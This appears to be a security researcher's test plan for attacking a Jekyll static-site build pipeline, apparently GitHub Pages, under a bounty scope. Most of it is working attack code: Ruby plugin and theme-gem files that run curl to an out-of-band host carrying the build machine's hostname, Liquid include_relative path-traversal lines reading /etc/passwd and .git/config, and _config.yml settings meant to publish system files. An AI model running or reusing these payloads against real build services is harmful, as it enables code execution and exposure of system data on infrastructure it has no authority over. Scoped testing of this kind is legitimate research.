# VECTOR 3: Jekyll Theme Code Execution + Liquid SSTI

## Hypothesis
The scope says: "Executing arbitrary code during the build process, either via
a custom Jekyll theme." If a custom theme can include Ruby code (plugins, gems),
that code executes during build. The question is: what's the SANDBOX boundary?

## Test A: Custom theme with Ruby plugin

Create `_plugins/exec.rb`:
```ruby
Jekyll::Hooks.register :site, :pre_render do |site|
  system("curl https://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/jekyll-plugin?host=#{`hostname`.strip}")
end
```

With `_config.yml`:
```yaml
title: Test
plugins: []
```

NOTE: GitHub Pages historically DISABLES custom plugins in safe mode.
But: if the theme gem includes a plugin, does safe mode block it?

## Test B: Theme gem with embedded code

Create `Gemfile`:
```ruby
source "https://rubygems.org"
gem "github-pages"
gem "jekyll-theme-evil", path: "./_theme"
```

Create `_theme/jekyll-theme-evil.gemspec`:
```ruby
Gem::Specification.new do |s|
  s.name = "jekyll-theme-evil"
  s.version = "0.1.0"
  s.summary = "Test"
  s.authors = ["test"]
  s.files = Dir["**/*"]
end
```

Create `_theme/lib/jekyll-theme-evil.rb`:
```ruby
system("curl https://d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro/theme-gem?host=#{`hostname`.strip}")
```

## Test C: Liquid SSTI via user content

Create `index.html`:
```html
---
---
{{ "test" | split: "" | join: "" }}
{% assign x = site.static_files %}
{% for f in x %}{{ f.path }}{% endfor %}
```

Try to access dangerous objects:
```html
{{ site.github }}
{{ jekyll }}
{{ page }}
{{ layout }}
{% assign cmd = "id" | split: " " %}
```

## Test D: Liquid file read via include_relative

```html
---
---
{% include_relative ../../../../etc/passwd %}
{% include_relative ../../../.git/config %}
{% include_relative /etc/passwd %}
```

## Test E: _config.yml with dangerous settings

```yaml
title: Test
source: /
destination: ./_site
include: ["/etc/passwd"]
keep_files: ["/etc"]
```

## Oracle
OOB: d9mffit1bt6qk4279dh046udjp76xu6qt.oast.pro
File read: check deployed site content for /etc/passwd contents

## Kill criteria
- Safe mode blocks ALL plugins (including theme gems)
- Liquid sandbox prevents file system access
- include_relative is path-restricted to site source
- _config.yml source/include are overridden by build system
